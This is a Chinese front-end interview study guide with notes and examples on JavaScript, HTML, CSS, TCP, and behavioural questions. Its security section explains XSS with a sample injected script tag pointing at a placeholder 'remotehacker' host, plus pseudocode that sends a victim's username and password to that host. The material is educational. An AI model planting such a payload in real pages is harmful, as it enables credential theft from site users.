# 前端面试题
## JS
* [面向对象实现](#面向对象实现)
* [面向对象中函数的作用](#面向对象中函数的作用)
* [闭包](#闭包)
* [null和undefined](#有还是没有)
* [get方式发送请求时传参处理](#传参处理)
* [this的指向](#指向问题)
* [delete用法](#删除操作)
* [将类数组转化为数组](#将类数组转化为数组)
* [标签的ID可以唯一标志DOM元素](#唯一识别标签)
* [数组去重](#数组去重)
* [面试题之js数组遍历](./codeFiles/面试题之js数组遍历.md)
* [面试题之js数组插入删除](./codeFiles/面试题之js数组插入删除.md)
* [跨域问题](#跨域问题)
* [判断终端环境信息](#判断终端环境信息)
* [document对象](#文档对象)
* [async/await关键字](#异步等待关键字)
* [事件代理](#事件代理)
* [用原生js实现addClass,removeClass方法](#用原生代码实现)
***
## HTML
* [谈谈你对HTML5语义化标签的理解](#语义化标签)
***
## CSS
* [rem和em单位](#像素单位)
* [css选择器](./codeFiles/css选择器.md)
* [css选择器优先级](./codeFiles/css选择器优先级.md)
* [纯css创建一个三角形](./codeFiles/创建三角形.md)
* [解释固定定位](#解释固定定位)
* [meta标签](./codeFiles/meta标签.md)
* [css文件引入的四种方式](#如何导入样式表)
* [BFC](#块级格式化上下文)
* [盒模型](#盒模型)
***
## 前端安全
* [XSS攻击](#跨站脚本攻击)
* [CSRF攻击](#跨站点请求伪造攻击)
***
## 计算机网络
* [三次握手与四次挥手](#三次握手与四次挥手)
***
## 开放性题目
* [你觉得你的缺点是什么？](#你的缺点)
* [谈谈你离开上一家公司的原因？](#离职原因)
* [谈谈你在未来5年的职业规划](#未来职业规划)
* [你为什么来应聘这个岗位](#你为什么来应聘这个岗位)
* [说一说你在工作中遇到的问题以及你是怎么解决的](#说一说你在工作中遇到的问题以及你是怎么解决的)
* [你在大学里的成绩并不好，是什么原因呢？](#本科成绩差)
* [你对薪资有什么要求？](#薪资)
* [你还有什么想要问我的么](#你还有什么想要问我的么)
***
***
## JS
### 面向对象实现
* 面向对象特点：继承、多态、封装
```javascript
  //机器类
  function Machine(name){}
  // 只要是这个构造器创建的实例，都共享prototype这块内存
  Machine.prototype={
    start: function(){},
    stop: function(){}
  }
  function Car(name,brand){}
  Car.prototype=new Machine();
  Car.prototype.open=function(){}
  Car.prototype.close=function(){}
  var c1=new Car();
  console.log(c1)
  console.log(c1 instanceof Car) // true
  console.log(c1 instanceof Machine) // true
  console.log(c1 instanceof Object) // true
  console.log(c1.constructor) //Object
  console.log(c1.__proto__.constructor) // Object
  
  //如何改变实例c1上constructor的指向
  //机器类
  function Machine(name){}
  // 只要是这个构造器创建的实例，都共享prototype这块内存
  Machine.prototype={
    start: function(){},
    stop: function(){}
  }
  function Car(name,brand){}
  Car.prototype=new Machine();
  Car.prototype.constructor=Car
  Car.prototype.open=function(){}
  Car.prototype.close=function(){}
  var c1=new Car();
  console.log(c1)
  console.log(c1 instanceof Car) // true
  console.log(c1 instanceof Machine) // true
  console.log(c1 instanceof Object) // true
  console.log(c1.constructor) //Car
  console.log(c1.__proto__.constructor) // Car
```
### 面向对象中函数的作用
```javascript
  function myfun() {
    // 功能函数
    // 功能函数调用的目的是拿到结果
    // 把一大块逻辑单独的封装起来
    // 以便于重复调用
  }
  function Car(){
    // 构造器函数
    // 构造函数调用的目的是拿到开辟的这块内存的引用
  }
```
### 闭包
* 为什么会出现闭包？ 我们需要从函数的外部得到函数内部的局部变量
* 闭包作用 一个是可以从函数的外部读取函数内部的变量，另一个就是让这些变量的值始终保持在内存中。
```javascript
// 下面这个不是闭包，但是
function parent(){
  var n=1;
  setTimeout(() => {
    console.log(n)
  }, 2000);
}
parent();
parent函数的执行是瞬间的（也许用时只是0.00001毫秒），在parent的函数体内创建了一个变量n，
在parent执行完毕之后n并没有被释放，这是因为setTimeout内的匿名函数存在这对n的引用。
待到2秒后函数体内的匿名函数被执行完毕,n才被释放。

怎么理解函数内部的变量一直保存在内存中？
function parent(){
  var n=1;
  add=function(){
    n+=1;
  }
  function child(){
    console.log(n)
  }
  return child;
}
var p=parent();
p(); //1
add();
p(); //2
一般函数执行完毕，局部作用域就会被销毁。但是
child函数一共运行了两次，第一次的值是1，第二次的值是2。
这证明了，函数parent中的局部变量n一直保存在内存中，并没有在parent调用后被自动清除。
```
* 闭包-封装
```javascript
(function(){
  var name="lk";
  var age=18;
  var test={}
  test.getName=function(){
    console.log(name)
  }
  test.getAge=function(){
    console.log(age)
  }
  window.test=test
})()
test.getName();
test.getAge();
console.log(test.name);
console.log(test.age);
利用闭包的特性能让我们封装一些复杂的函数逻辑，在这个例子中调用test上的方法（getName,getAge）间接访问函数里私有变量，
但是直接调用test.name是没法拿到name的。
```
### 有还是没有
```javascript
<script>
//undefined代表的是申明未赋值
//null代表不存在
var a;
console.log(a)//undefined
var b=document.getElementById('div1')
console.log(b)//null
//有还是没有呢
//if里面表达式为单独一个值时，表示判断有没有
if(!a){
  console.log('没有')
}
if(!b){
  console.log('没有')
}
//null/undefined和true/false根本没关系
console.log(a===true);//false
console.log(b===true);//false
console.log(a===false);//false
console.log(b===false);//false
//
(function add(x){
  console.log(x)//x为undefined因为，x开始是有的只是未赋值而已
})()
//对象里面value没值时，为undefined,有点不好理解
var person={name:'lk'}
console.log(person.age)//undefined
</script>
```
### 传参处理
```javascript
// 如何处理get的传参
const queryString=require('querystring');
var url="http://www.baidu.com?";
var params={name:'lk',age:undefined,sex:1}
//清除无意义的键值
var clearNullKeys=function (src){
  let target={}
  for(let key in src){
    if(src.hasOwnProperty(key) && src[key] !==null && src[key] !==undefined){
      target[key]=src[key]
    }
  }
  return target
}
console.log(clearNullKeys(params)) //{ name: 'lk', sex: 1 }
console.log(url+queryString.stringify(clearNullKeys(params))) //http://www.baidu.com?name=lk&sex=1
```
### 指向问题
* this的指向是由它所在函数调用的上下文决定的，而不是由它所在函数定义的上下文决定的
```javascript
<script>
var name="lk";
var obj={
  name: 'hha',
  getName: function(){
    function test(){
      return this.name
    }
    return test
  }
}
console.log(obj.getName()()) //lk this所在的函数在外面调用
</script>
```
```javascript
<script>
var name="lk";
var obj={
  name: 'hha',
  getName: function(){
    var that=this;
    function test(){
      return that.name
    }
    return test
  }
}
console.log(obj.getName()()) //hha
</script>
```
### 删除操作
```javascript
<script>
// 可以删除对象的属性
let obj={
  name: 'lk'
}
console.log(delete obj.name); //true

// 删除申明的变量
var age=18; //使用var申明的变量不能被删除
sex=1;
console.log(delete age); //false
console.log(delete sex); //true

// 使用eval()解析的一段代码，尽管用了val,也能删除
eval('var aa=123');
console.log(delete aa); //true

//注意delete删除数组 数组长度不变，数组的索引也不变
var test=[]
test[1]=2;
test[4]=3;
console.log(test) //[,2,,,3]
console.log(delete test[1]); //true
console.log(test) //[,,,,3]

//原理 
var person={
  name:'zz'
}
Object.defineProperty(person,'name',{
  configurable:false
})
console.log(delete person.name); //false
</script>
```
### 将类数组转化为数组
```javascript
function test(){
  return arguments;
}
var aa=test(1,2,3,4);
console.log(aa); //aa 就是类数组
console.log(Array.prototype.slice.call(aa)); //[1,2,3,4]
//ES6
console.log(aa) //aa 就是类数组
console.log(Array.from(aa))
console.log(aa) //aa 就是类数组
</script>
```
### 唯一识别标签
```javascript
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>test</title>
</head>
<body>
  <div id="app">this is div</div>
</body>
<script>
  console.log(app) //<div id="app">this is div</div>
  console.log(window.app) //<div id="app">this is div</div>
  console.log(document.getElementById('app')===app) //true
</script>
</html>
```
#### ul标签下面有很多li标签，点击每一个li标签都能打印出该标签的内容
```html
<!doctype html>
<html>
    <head>
    <meta charset="utf-8">
    <title>test for jobs</title>
    </head>
    <body>
        <p>this is p element!!!</p>
        <ul class="list">
            <li>a<b>success</b></li>
            <li>b</li>
            <li>c</li>
            <li>d<em>1234</em></li>
        </ul>
    </body>
    <script>
        console.log("Hello World !!!");
        var oLi=document.querySelectorAll("li");
        for(let i=0;i<oLi.length;i++){
            /*
            oLi[i].onclick=function(){
                console.log(oLi[i].textContent);
            }*/
            /*
            oLi[i].addEventListener('click',function(){
                console.log(oLi[i].innerHTML);
            })*/
            oLi[i].addEventListener('click',function(){
                console.log(oLi[i].innerText);
            })
        }
    </script>
</html>
    
<!DOCTYPE html>
<html lang="en">
<head>
  <title>test html</title>
</head>
<body>
  <ul id="test">
    <li>AA</li>
    <li>BB</li>
    <li>CC</li>
    <li>DD</li>
  </ul>
</body>
<script>
  /*
  var oLi=document.getElementById('test')
  var arr=oLi.getElementsByTagName('li')
  for(var i=0;i<arr.length;i++){
    arr[i].onclick=function(){
      console.log(this.textContent)
    }
  }
  */
  
  // for循环每循环一次，创建一个块级作用域
  var oLi=document.getElementById('test')
  var arr=oLi.getElementsByTagName('li')
  for(let i=0;i<arr.length;i++){
    arr[i].onclick=function(){
      console.log(arr[i].textContent)
    }
  }
  
  //for循环每循环一次，创建一个局部作用域，分别存储不同的变量i
  /*
  var oLi=document.getElementById('test')
  var arr=oLi.getElementsByTagName('li')
  for(var i=0;i<arr.length;i++){
    (function(i){
      arr[i].onclick=function(){
      console.log(this.textContent)
    }
    })(i)  
  }
  */
</script>
</html>
```
```
做这道题目有几点需要注意的：
1，任何标签都可以添加点击事件
2,for循环里面不能使用var声明，要用let申明
3，要获取标签里面的内容，只有少数标签支持text属性
支持text属性的标签：>>>>>>>>>>
                    var script=document.querySelector('script');
                    var title=document.querySelector('title');
几乎所有的标签都支持 textContent innerHTML innerText 属性 
    textContent和innerText产生的效果是一样的，innerHTML可以打印出里面的标签结构
```
***
#### 数组去重
* 利用一个空的obj对象，将数组一个个放进去，如果是第一次放，则这是我们需要的值，应该保留
```node
let arr=[1,2,2,3,3,4,4,5,5,5,5,7]
let obj={}
var newArr=arr.filter(v=>{
  if(obj[v]){
    return false
  }else{
    obj[v]=true
    return true
  }
})
console.log(newArr)
```
* 我们将保留依据查找得到的序号和自己本身序号相同的元素
```node
let arr=[1,2,2,3,3,4,4,5,5,5,5,7]
var newArr=arr.filter((v,index)=>arr.indexOf(v,0) === index)
console.log(newArr)
```
* set是一种定义不重复数组的数据类型
```node
let arr=[1,2,2,3,3,4,4,5,5,5,5,7]
let newArr=Array.from(new Set(arr))
console.log(newArr)
```
* 扩展运算符
```node
let arr=[1,2,2,3,3,4,4,5,5,5,5,7]
let newArr=[...new Set(arr)]
console.log(newArr)
```
* reduce 思路一样
```node
let arr=[1,2,2,3,3,4,4,5,5,5,5,7]
let obj={}
let newArr=arr.reduce((p,c)=>{
  obj[c] ? '':obj[c]=true && p.push(c)
  return p
},[])
console.log(newArr)
```
***
#### 跨域问题
* jsonp跨域 script标签可以实现跨域，可以执行远程服务器上的脚本
```javascript
// 远程服务器上
// test.js
console.log('我在远程服务器上！！！')

//客户端 控制台将打印结果
<script src="http://harrdy2018.github.io/test.js"></script>
```
* jsonp跨域请求信息
```javascript
// 远程服务器上
// myinfo
getData({
name: 'lukang',
age: 18,
sex: 0
})

// 浏览器
<script>
  function getData(data){
    console.log(data)
  }
</script>
<script src="http://harrdy2018.github.io/myinfo"></script>
```
* jsonp跨域实现百度搜索栏
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>百度搜索栏</title>
</head>
<body>
<p>百度</p>
<input type="text">
<ul></ul>
</body>
<script src="./jquery-3.3.1.js"></script>
<script>
    function createLi(item) {
        var oUl=document.querySelector('ul');
        var oLi=document.createElement('li');
        var oText=document.createTextNode(item);
        oLi.appendChild(oText);
        oUl.appendChild(oLi);
    }
    function getData(data) {
        var obj=document.querySelector('#jsonp');
        obj.parentNode.removeChild(obj);
        document.querySelector('ul').innerHTML='';
        data.s.forEach((item,index,arr)=>{
            createLi(item);
        })
    }
    function getList(wd){
        var obj=document.createElement("script");
        obj.id="jsonp";
        obj.src="https://sp0.baidu.com/5a1Fazu8AA54nxGko9WTAnF6hhy/su?cb=getData&wd="+wd;
        document.body.appendChild(obj);
    }

    var oInput=document.querySelector('input');
    oInput.addEventListener('keyup',function () {
        var wd=oInput.value;
        console.log(wd);
        getList(wd);
    });
</script>
</html>
```
### 判断终端环境信息
* window.navigator.userAgent 判断终端设备
```javascript
Google浏览器 
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36
Edge浏览器 
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134
ie浏览器
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; rv:11.0) like Gecko

判断是否是Edge浏览器
let isEdge=window.navigator.userAgent.indexOf('Edge')>-1;
判断是否是ie 11浏览器 ie内核是Trident
let isIE11=window.navigator.userAgent.indexOf('Trident')>-1 && window.navigator.userAgent.indexOf('rv:11.0')>-1;
```
### 文档对象
```html
<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <title>测试js代码</title>
  </head>
  <body>
    <ol>
      <li>1</li>
      <li>2</li>
      <li>3</li>
    </ol>
    <div id="div1">我将用id获取</div>
    <div id="div1">我将又用id获取</div>
    <div class="example">我将用样式类名获取</div>
    <div class="example">我将又用样式类名获取</div>
    <div name="example">我将用name属性获取</div>
    <div name="example">我将又用name属性获取</div>
  </body>
  <script>
    // 选择节点
    var oLi=document.querySelector('li') //默认选择最前面一个 HTMLLIElement
    var oLiArray=document.querySelectorAll('li') //返回集合 NodeList
    var oDiv=document.getElementById("div1") //默认选择最前面一个 HTMLDivElement
    var ooDiv=document.getElementsByClassName('example') //返回集合 HTMLCollection
    var oName=document.getElementsByName("example") //返回集合 NodeList
    var oTag=document.getElementsByTagName('div') //返回集合 HTMLCollection
    // 创建节点
    //创建元素节点
    var oBtn=document.createElement('BUTTON') //HTMLButtonElement
    //创建文本节点
    var oText=document.createTextNode("hahahhahh") //Text
    //创建注释节点
    var oComment=document.createComment("ahhahhahahhah") //Comment
    //创建属性节点
    var oAttr=document.createAttribute("class");
    console.log(oAttr)
    oAttr.value="myClass"
    console.log(oAttr)
    console.log(toString.call(oAttr)) //Attr
    //创建文档片段节点
    var oDocFrag=document.createDocumentFragment();
    var oLi=document.createElement('LI');
    oLi.textContent="我在文档片段里面";
    oDocFrag.appendChild(oLi);
    console.log(oDocFrag)
    console.log(toString.call(oDocFrag)) //DocumentFragment
  </script>
</html>
```
### 异步等待关键字
* 初识async
```js
//通过在函数前面加关键字async,使得函数返回一个promise对象
async function f1(){
  return 'hello world'
}
var res=f1()
res.then(data=>console.log(data)) //hello world

//由于函数没返回值相当于 return undefined
async function f2(){
  console.log('hello world')//hello world
}
var res=f2()
res.then(data=>console.log(data)) //undefined

//直接返回一个promise对象
async function f(){
  return new Promise((resolve,reject)=>{
    resolve("I success")
  })
}
var res=f()
res.then(data=>console.log(data)) //I success

//当async函数执行时，遇到await就会停止等待，直到异步操作完整之后，如果await后面接promise,则不会往下面执行
async function f(){
  await Promise.reject("reject status")
  console.log("这里执行么")
  return "haha"
}
f().then(()=>{},data=>console.log(data)) //reject status

//如果await后面不是接promise，则按照函数的返回值
async function f(){
  await '1213'
  await 123456
  await true
  console.log("这里执行么")
  return "haha"
}
f().then((data)=>{console.log(data)},data=>console.log(data))//这里执行么 haha

//只要一个await语句后面的 Promise 变为reject，那么整个async函数都会中断执行
async function f(){
  await Promise.resolve("successA")
  console.log("这里执行么A")
  await Promise.reject("faield")
  await Promise.resolve("successB")
  console.log("这里执行么B")
  return "haha"
}
f().then((data)=>{console.log(data)},data=>console.log(data)) //这里执行么A faield
```
* async函数的错误处理机制
```js
//async函数内部抛出错误，会导致返回的 Promise 对象变为reject状态。抛出的错误对象会被catch方法回调函数接收到
async function f(){
  throw new Error("has error")
}
f().catch(e=>console.log(e))
```
### 事件代理
```html
<!--test.html-->
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>test html</title>
</head>
<body>
<ul>
  <li>AAA</li>
  <li>BBB</li>
  <li>CCC</li>
  <li>DDD</li>
  <li>EEE</li>
  <li>FFF</li>
  <li>GGG</li>
</ul>
</body>
<script>
  var oUl=document.querySelector("ul");
  oUl.addEventListener('click',event=>{
    if(event.target.tagName.toLowerCase()==="li"){
      event.target.style.backgroundColor="red";
    }
  })
</script>
</html>
```
### 用原生代码实现
```node
  function addClass(e,newClassName){
    let classArray=Array.from(e.classList)
    let index=classArray.indexOf(newClassName,0)
    // 如果是新的样式类名
    if(index ===-1){
      classArray.push(newClassName)
      e.className=classArray.join(' ')
    }
  }
  function removeClass(e,deleteClassName){
    let classArray=Array.from(e.classList)
    let index=classArray.indexOf(deleteClassName,0)
    // 如果样式类名已经存在
    if(index !== -1){
      classArray.splice(index,1)
      e.className=classArray.join(' ')
    }
  }
```
***
***
***
## HTML
### 语义化标签
* 为什么会出现语义化标签?
```
当下html是靠div+css来铸造页面的整体框架和结构的，通篇大量的div可读性极低，因此诞生了这些特殊的标签，简单地说就是见名知义，
使页面更清晰，方便维护和开发。
```
* 什么是语义化标签？
```
语义是指对一个词或者句子含义的正确解释。
很多html标签也具有语义的意义，也就是说元素本身传达了关于标签所包含内容类型的一些信息。
例如，当浏览器解析到<h1></h1>标签时，它将该标签解释为包含这一块内容的最重要的标题。
h1标签的语义就是用它来标识特定网页或部分最重要的标题。
```
* 语义化标签的作用？
```
代码结构: 使页面没有css的情况下，也能够呈现出很好的内容结构
有利于SEO: 爬虫依赖标签来确定关键字的权重，因此可以和搜索引擎建立良好的沟通，帮助爬虫抓取更多的有效信息
提升用户体验： 例如title、alt可以用于解释名称或者解释图片信息，以及label标签的灵活运用。
便于团队开发和维护: 语义化使得代码更具有可读性，让其他开发人员更加理解你的html结构，减少差异化。
方便其他设备解析: 如屏幕阅读器、盲人阅读器、移动设备等，以有意义的方式来渲染网页。
```
* h1~h6标签 用于定义页面的标题，h1元素具有最高等级，h6元素具有最低的等级
* header标签 定义页面的介绍展示区域，通常包括网站logo、主导航、全站链接以及搜索框
* nav标签 定义页面的导航链接部分区域
* main标签 定义页面的主要内容，一个页面只能使用一次
* article标签 定义页面独立的内容，它可以有自己的header、footer、sections等
* section标签 用于标记文档的各个部分，例如长表单文章的章节或主要部分
* aside标签 定义与主要内容相关的内容块。通常显示为侧边栏
* footer标签 定义文档的底部区域，通常包含文档的作者，著作权信息，链接的使用条款，联系信息等
* blockquote标签
```html
<body>
<span>这里测试块引用的开始</span>
<blockquote cite="https://www.baidu.com">
  块引用，blockquote为块级元素
  四周都有margin,cite属性可用来规定引用的来源
</blockquote>
<span>这里测试块引用的结尾</span>
</body>
```
* strong和em标签
```html
<strong>把文本定义为语气更强的强调的内容，以表示内容的重要性 样式加粗</strong>
<em>标记内容着重点，通常呈现为斜体文字</em>
```
* small标签 为较不重要的内容定义小字体
```html
如果被包围的字体已经是字体模型所支持的最小字号，那么此标签将不起任何作用
<p>这是正常字体</p>
<small>这是小一点的字体</small>
```
* abbr标签 解释缩写词。使用title属性可提供全称
```html
由于使用了title属性，鼠标移到PRC时会出现全称
<abbr title="People's Republic of China">PRC</abbr>
```
* q标签 标记一个短的引用
```html
<body>
<q>样式就是加了一个引号</q>
</body>
```
* li标签 可以单独使用 默认无序列表
```html
<body>
<li>测试li标签A</li>
<li>测试li标签B</li>
<li>测试li标签C</li>
</body>
```
* ul、ol标签只有搭配li标签才能发挥其真正作用
* p、a标签
***
***
***
## css
### 像素单位
* rem 相对于根元素的字体大小 16px，10rem 将等同于 160px，即 10 x 16 = 160
```html
 html{
      font-size: 16px;
      padding: 10rem;
    }
浏览器解析padding为160px;
```
* em
```
有一个比较普遍的误解，认为 em 单位是相对于父元素的字体大小。 事实上，根据W3标准 ，它们是相对于使用em单位的元素的字体大小。
父元素的字体大小可以影响 em 值，但这种情况的发生，纯粹是因为继承
```
```html
p{
      font-size: 16px;
      padding: 10em;
    }
浏览器解析padding为160px;
```
* em 单位是相对于他们最终获得(不是父元素)的字体大小
```html
<!--test.html-->
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>test html</title>
  <style>
    div{
      font-size: 14px;
    }
    p{
      font-size: 16px;
      padding: 1.5em;
      /*16x1.5=24*/
    }
  </style>
</head>
<body>
  <div>
    <p></p>
  </div>
</body>
<script>
</script>
</html>
```
```
font-size: 62.5%;   1rem = 10px;
font-size: 100%;    1rem = 16px;
// 对根元素这样设置可以方便我们接下来进行单位的换算
```
### 解释固定定位
```
固定定位是相对于浏览器窗口而言的，当滚动右边滚动条时，div位置不变，就好像静止一样
怎么出现滚动条？ 将html设置为100% body设置为200%
当没有固定定位时，你会发现，移动滚动条时，div跑到上面去了。
```
```html
 <style>
    html{
      height: 100%;
    }
    body{
      margin: 0px;
      height: 200%;
    }
    div{
      width: 200px;
      height: 200px;
      background-color: brown; 
    }
  </style>
```
```html
  <style>
    html{
      height: 100%;
    }
    body{
      margin: 0px;
      height: 200%;
    }
    div{
      position: fixed;
      width: 200px;
      height: 200px;
      background-color: brown; 
    }
  </style>
```
### 如何导入样式表
* 直接在标签里写样式
* 内联css文件，直接在head里面写css
* 链接式:在网页的<head></head>标签对中使用<link>标记来引入外部样式表文件
```
link标签
rel  必需.定义当前文档与被链接文档之间的关系 icon/last/license/next/stylesheet
type 规定被链接文档的MIME类型
href 定义被链接文档的位置
```
```css
/*test.css*/
div{
  width: 100px;
  height: 100px;
  background-color: red;
}
```
```html
<!--test.html-->
<!DOCTYPE html>
<html lang="en">
<head>
  <title>test html</title>
  <link rel="stylesheet" type="text/css" href="./test.css"/>
</head>
<body>
<div></div>
</body>
<script>
</script>
</html>
```
* @import 导入式
```html
<!--test.html-->
<!DOCTYPE html>
<html lang="en">
<head>
  <title>test html</title>
  <style>
    @import "./test.css"
  </style>
</head>
<body>
<div></div>
</body>
<script>
</script>
</html>
```
```
link引用和import引用区别是：link是html加载前就引用，而import是html加载后才引用。
举例，采用impor引用，会先显示无样式的页面，然后再把样式放进去
```
### 块级格式化上下文
* BFC规则
```
1,BFC就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素。
  通俗一点来讲，可以把 BFC 理解为一个封闭的大箱子，箱子内部的元素无论如何翻江倒海，都不会影响到外部
2,计算BFC的高度时，浮动元素也参与计算。
```
* 触发BFC
```
只要元素满足下面任一条件即可触发 BFC 特性：

body 根元素
浮动元素：float 除 none 以外的值
绝对定位元素：position (absolute、fixed)
display 为 inline-block、table-cells、flex
overflow 除了 visible 以外的值 (hidden、auto、scroll)
```
#### BFC 特性及应用
* 同一个 BFC 下外边距会发生折叠
```html
<!--test.html-->
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>test html</title>
  <style>
    div{
      width: 100px;
      height: 100px;
      background-color: lightblue;
      margin: 100px;
    }
  </style>
</head>
<body>
<div></div>
<div></div>
</body>
<script>
</script>
</html>
```
```
从效果上看，因为两个 div 元素都处于同一个 BFC 容器下 (这里指 body 元素) 
所以第一个 div 的下边距和第二个 div 的上边距发生了重叠，所以两个盒子之间距离只有 100px，而不是 200px。
如果想要避免外边距的重叠，可以将其放在不同的 BFC 容器中。
```
```html
<!--test.html-->
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>test html</title>
  <style>
    .test{
      overflow: hidden;
    }
    p{
      width: 100px;
      height: 100px;
      background-color: lightblue;
      margin: 100px;
    }
  </style>
</head>
<body>
<div class="test">
  <p></p>
</div>
<div class="test">
  <p></p>
</div>
</body>
<script>
</script>
</html>
```
* BFC 可以包含浮动的元素（清除浮动）
```
因为height: auto;的计算结果不是一定为0的。
正常父元素包含浮动子元素，父元素的高度确实为0。
但是父元素overflow:hidden;后，首先会计算height: auto;的真实高度，由于其触发了BFC，需要包含子元素，所以高度不是0，
而是子元素高度。
这时overflow:hidden;才起到隐藏作用，不过父元素高度足够大，所以子元素没有被隐藏。
总之，是先计算真实高度，再去隐藏。如果是先直接隐藏了，再去计算高度也就没有意义了。

这实际上是解决高度坍塌问题，IE6以上浏览器是overflow: hidden;开启BFC
IE6浏览器是zoom:1;开启hasLayout,和BFC性质类似
zoom表示放大的意思，后边跟着一个数值，写几就将元素放大几倍
zoom:1表示不放大元素，但是通过该样式可以开启hasLayout
zoom这个样式，只在IE中支持，其他浏览器都不支持。
```
```html
<!--test.html-->
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>test html</title>
  <style>
    .out{
      border: 1px solid #000;
      overflow: hidden;
    }
    .in{
      width: 100px;
      height: 100px;
      background-color: #eee;
      float: left;
    }
  </style>
</head>
<body>
<div class="out">
  <div class="in"></div>
</div>
</body>
<script>
</script>
</html>
```
* BFC 可以阻止元素被浮动元素覆盖
```html
<!--test.html-->
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>test html</title>
  <style>
    .A{
      height: 100px;
      width: 100px;
      float: left;
      background-color: lightblue;
    }
    .B{
      width: 200px; 
      height: 200px;
      background: #eee;
    }
  </style>
</head>
<body>
  <div class="A">我是一个左浮动的元素,height: 100px;width: 100px;</div>
  <div class="B">我是一个没有设置浮动, 也没有触发 BFC 元素, width: 200px; height:200px;</div>
</body>
<script>
</script>
</html>

这时候其实第二个元素有部分被浮动元素所覆盖，(但是文本信息不会被浮动元素所覆盖) 如果想避免元素被覆盖，
可触第二个元素的 BFC 特性，在第二个元素中加入 overflow: hidden，就会变成：
<!--test.html-->
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>test html</title>
  <style>
    .A{
      height: 100px;
      width: 100px;
      float: left;
      background-color: lightblue;
    }
    .B{
      width: 200px; 
      height: 200px;
      background: #eee;
      overflow: hidden;
    }
  </style>
</head>
<body>
  <div class="A">我是一个左浮动的元素,height: 100px;width: 100px;</div>
  <div class="B">我是一个没有设置浮动, 也没有触发 BFC 元素, width: 200px; height:200px;</div>
</body>
<script>
</script>
</html>
```
### 盒模型
* 盒子模型组成为：margin、border、padding、content
```
标准盒子模型，默认的
box-sizing: content-box;
W3盒子模型的width = content
W3盒子模型的height = content
css设置的width和height就是content内容大小。padding、border的大小并不会影响content的大小。

IE盒子模型
 box-sizing: border-box;
IE盒子模型的width = content+padding+border
IE盒子模型的height = content+padding+border
例如增加padding宽度大小使得盒子宽度大于设置的宽度会将content的大小被压缩，最终content大小会变为0
```
***
***
***
## 前端安全
### 跨站脚本攻击
```
XSS又称为CSS(CrossSiteScript)即跨站脚本攻击，是为了不与CSS(层叠样式表)混淆
记住永远不要相信用户的输入！！！

在表单提交的过程中，如果黑客嵌入脚本攻击代码：
<script src="http://remotehacker/hack.js"></script>，这段代码会根据表单的字段保存在该网站的数据库中，此时代码不会执行。
如果用户点击了修改，查看，使表单重现在页面上的操作，此时恶意代码就会执行。

//hack.js伪代码
第一步获取cookie用户名和密码
      un=username
      ps=password
第二步js脚本构造script标签发送get请求<script src="http://remotehacker/info.py?username=&password=ps></script>
      python脚本info.py获取请求参数，将用户名和密码存到黑客服务器本地文件中
```
### 跨站点请求伪造攻击
```
CSRF（Cross Site Request Forgery），中文是跨站点请求伪造。
CSRF攻击者在用户已经登录目标网站之后，诱使用户访问一个攻击页面，利用目标网站对用户的信任，
以用户身份在攻击页面对目标网站发起伪造用户操作的请求，达到攻击目的。

CSRF攻击的本质原因
CSRF攻击是源于Web的隐式身份验证机制！Web的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，
但却无法保证该请求是用户批准发送的。CSRF攻击的一般是由服务端解决。
```
***
***
***
## 计算机网络
### 三次握手与四次挥手
```
1.序列号seq
    占四个字节，用来标记数据段的顺序，TCP把连接中发送的所有数据字节都编上了一个序号，第一个字节的编号有本地随机产生，
    给字节编上序号之后，就给每一个报文段指派一个序号，序列号seq就是这个报文段中的第一个字节的数据编号。
2.确认号ack
    占四个字节，期待收到对方下一个报文段的第一个数据字节的序号，序列号表示报文段携带数据的第一个字节编号，
    而确认号指的是期望接收到下一个字节的编号，因此报文段的最后一个字节的编号+1就是确认号。
3.确认ACK
    占1位bit位，仅当ACK = 1，确认号字段才有效。
4.同步SYN
    连接建立时用于同步序号。
    当SYN = 1，ACK = 0表示这是一个连接请求报文段。
    当SYN = 1，ACK = 1表示服务器同意连接。
    SYN这个标志位只有在YCP建立连接才会被设置为1，握手完成后SYN被设置为0
5.终止FIN
    用来释放一个TCP连接
```
* 三次握手
```
第一次握手
   客户端向服务器发送建立连接请求，发送SYN报文，
   seq = x，表明传输数据时的第一个数据字节的序号是x
   SYN = 1 , ACK = 0.表示这是一个TCP连接请求数据报文
   并进入SYN_SENT状态，等待服务器确认
第二次握手
   服务器接收到客户端请求之后，必须确认客户的数据包。
   SYN = 1,ACK = 1
   seq（服务器）= y
   服务器对客户端初始序号的确认号ack（服务器）=seq（客户端）+ 1 = x +1
   此时服务器进入SYN_RECV状态。
第三次握手
   客户端收到消息，向服务器发送：
   seq = x +1
   确认号ack(客户端)=y+1，此包发送完毕，客户端和服务器进入ESTAB_LISHED（TCP连接成功状态）
```
***
***
***
### 你的缺点
```
我的缺点是，做事的时候顾虑太多，虽然会让我少犯一些差错，但很可能在决策过程中错过一些好机会，
这要求我注重团队协作，运用集体智慧，排查风险，抓住机会。
我心直口快，容易得罪人。不过我向来对事不对人，而且事后也主动道歉，和我相处过一段时间的人都能理解我的这个缺点。
```
### 离职原因
```
我在上一家公司干的还可以，也取得了一定的成绩，但在职业上遇到了瓶颈，进步太慢。
这让我很痛苦，所以我来了，因为我想寻求更广阔的发展空间，更好的实现我的人生价值
```
### 未来职业规划
```
非常感谢您的提问，首先，这是一个我非常感兴趣的行业，能将我的工作和兴趣相结合，
因此，目前我会认真的对待该岗位，希望能尽快融入公司团队。
